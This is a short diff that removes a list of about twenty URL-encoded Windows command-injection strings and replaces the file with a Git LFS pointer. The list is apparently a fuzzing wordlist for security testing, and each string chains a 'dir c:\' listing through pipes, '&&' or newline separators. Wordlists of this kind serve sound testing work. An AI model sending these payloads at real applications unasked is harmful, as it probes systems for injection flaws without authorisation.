@@ -1,20 +1,3 @@
-+|+Dir+c:\
-$+|+Dir+c:\
-%26%26+|+dir c:\
-$%26%26dir c:\
-%0a+dir+c:\
-+|+Dir+c:%255c
-$+|+Dir+c:%255c
-%26%26+|+dir c:%255c
-$%26%26dir+c:%255c
-%0a+dir+c:%255c
-+|+Dir+c:%2f
-$+|+Dir+c:%2f
-%26%26+|+dir c:%2f
-$%26%26dir+c:%2f
-%0a+dir+c:%2f
-+dir+c:\+|
-+|+dir+c:\+|
-+|+dir+c:%2f+|
-dir+c:\
-||+dir|c:\
+version https://git-lfs.github.com/spec/v1
+oid sha256:6151e2f4bbee864949e9840c1b43e556bf80d89f39e8235b09e10863bf6a7b6a
+size 289
